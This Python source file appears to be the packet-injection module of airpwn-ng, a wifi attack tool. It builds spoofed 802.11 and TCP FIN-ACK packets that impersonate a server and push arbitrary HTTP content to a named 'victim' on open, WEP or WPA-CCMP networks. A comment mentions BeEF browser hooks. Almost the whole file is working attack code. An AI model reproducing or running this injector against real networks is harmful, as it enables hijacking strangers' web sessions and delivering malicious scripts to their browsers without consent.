from binascii import unhexlify
from lib.headers import Headers
from lib.visuals import Bcolors
from pyDot11 import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.packet import Padding, Raw
from scapy.sendrecv import sendp
import fcntl, socket, struct, sys, time

## DEBUG
from scapy.utils import wrpcap

global npackets
npackets = 0

class Injector(object):
    """Uses scapy to inject packets on the networks"""
    
    def __init__(self, interface, args):
        self.interface = interface
        self.args = args
        
        ## Create a header that works for encrypted wifi having FCS
        ### These bytes can be switched up, if memory serves, this is a channel 6 RadioTap()
        rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
        self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))
        

    def getHwAddr(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac = ':'.join(['%02x' % ord(char) for char in info[18:24]])
        return mac


    def inject(self,
               vicmac,
               rtrmac,
               dstmac,
               vicip,
               svrip,
               vicport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr):
        """Send the injection using Scapy
        
        This method is where the actual packet is created for sending
        Things such as payload and associated flags are genned here
        FIN/ACK flag is sent to the victim with this method
        """
        global npackets
        npackets += 1
        sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
        sys.stdout.flush()
        
        ## Injection using Monitor Mode
        if self.args.inj == 'mon':
            hdr = Headers()
            headers = hdr.default(injection)

            ## WEP/WPA
            if self.args.wep or self.args.wpa:
                packet = self.rTap\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = dstmac,
                              subtype = 8L,
                              type = 2
                              )\
                        /Dot11QoS()\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )
            ## Open
            else:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = dstmac
                              )\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )
                    
            if TSVal is not None and TSecr is not None:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp', ((round(time.time()), TSVal)))
                                      ]
            else:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp', ((round(time.time()), 0)))
                                      ]

            ## WPA Injection
            if self.args.wpa is not None:
                if self.shake.encDict.get(vicmac) == 'ccmp':
                    
                    ### Why are we incrementing here?  Been done before in wpaEncrypt(), verify this.
                    try:
                        self.shake.PN[5] += 1
                    except:
                        self.shake.PN[4] += 1

                    try:
                        packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[1],
                                            self.shake.origPkt,
                                            packet,
                                            self.shake.PN,
                                            True)

                    except:
                        sys.stdout.write(Bcolors.FAIL + '\n[!] pyDot11 did not work\n[!] Injection failed\n ' + Bcolors.ENDC)
                        sys.stdout.flush()
                else:
                    sys.stdout.write(Bcolors.FAIL + '\n[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed\n ' + Bcolors.ENDC)
                    sys.stdout.flush()
                    #packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[0],
                                        #self.shake.origPkt,
                                        #packet,
                                        #self.shake.PN,
                                        #True)
                
                

                if self.args.v is False:
                    sendp(packet, iface = self.interface, verbose = 0)
                else:
                    sendp(packet, iface = self.interface, verbose = 1)
                if self.args.pcap is True:
                    wrpcap('outbound.pcap', packet)

            ## WEP Injection
            elif self.args.wep is not None:
                try:
                    packet = wepEncrypt(packet, self.args.wep)
                except:
                    sys.stdout.write(Bcolors.FAIL + '\n[!] pyDot11 did not work\n[!] Injection failed\n ' + Bcolors.ENDC)
                    sys.stdout.flush()

                if self.args.v is False:
                    sendp(packet, iface = self.interface, verbose = 0)
                else:
                    sendp(packet, iface = self.interface, verbose = 1)
                if self.args.pcap is True:
                    wrpcap('outbound.pcap', packet)


            ## Open WiFi Injection
            else:
                if self.args.v is False:
                    sendp(packet, iface = self.interface, verbose = 0)
                else:
                    sendp(packet, iface = self.interface, verbose = 1)
                if self.args.pcap is True:
                    wrpcap('outbound.pcap', packet)


            ### Single packet exit point
            ### Used for BeEF hook examples and such
            if self.args.single is True:
                sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
                sys.exit(0)

        ## Injection using Managed Mode
        else:
            hdr = Headers()
            headers = hdr.default(injection)
            packet = Ether(\
                          src = self.getHwAddr(self.interface),\
                          dst = vicmac\
                          )\
                    /IP(
                        dst = vicip,
                        src = svrip
                        )\
                    /TCP(
                        flags = 'FA',
                        sport = int(svrport),
                        dport = int(vicport),
                        seq = int(seqnum),
                        ack = int(acknum)
                        )\
                    /Raw(
                        load = headers + injection
                        )

            if TSVal is not None:
                packet[TCP].options = [\
                                      ('NOP', None),\
                                      ('NOP', None),\
                                      ('Timestamp', ((round(time.time()), TSVal)))\
                                      ]
            else:
                packet[TCP].options = [\
                                      ('NOP', None),\
                                      ('NOP', None),\
                                      ('Timestamp', ((round(time.time()), 0)))\
                                      ]
            
            if self.args.v is False:
                sendp(packet, iface = self.interface, verbose = 0)
            else:
                sendp(packet, iface = self.interface, verbose = 1)
            if self.args.pcap is True:
                wrpcap('outbound.pcap', packet)
